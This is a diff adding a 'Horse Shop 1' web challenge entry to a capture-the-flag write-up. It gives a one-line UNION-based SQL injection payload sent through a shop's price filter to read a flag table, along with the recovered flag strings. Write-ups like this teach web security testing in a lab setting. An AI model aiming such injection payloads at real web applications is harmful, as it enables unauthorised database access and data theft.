@@ -18,6 +18,20 @@ FLAG:
 
     nrzCTF{1_9RE3t_YOU_d3sCEnDAn7_OF_Asen@}
 
+### Horse Shop 1 - WEB
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/2c40eb11-8cd3-469f-8787-8ddf147f7237)
+
+SQL injection, payload `price=' union select 0,1,2,flag,5,6,7 from flag-- -&age=&color=&breed=`
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/bac89fec-4945-4685-956b-87782c818a0e)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/f1f96776-2b8f-48f0-918e-425ff893481e)
+
+FLAG:
+
+    nrzCTF{h0r5e_sh0p_cla55ic_sql1}
+
 # OSINT
 
 ### Ganegabla - OSINT
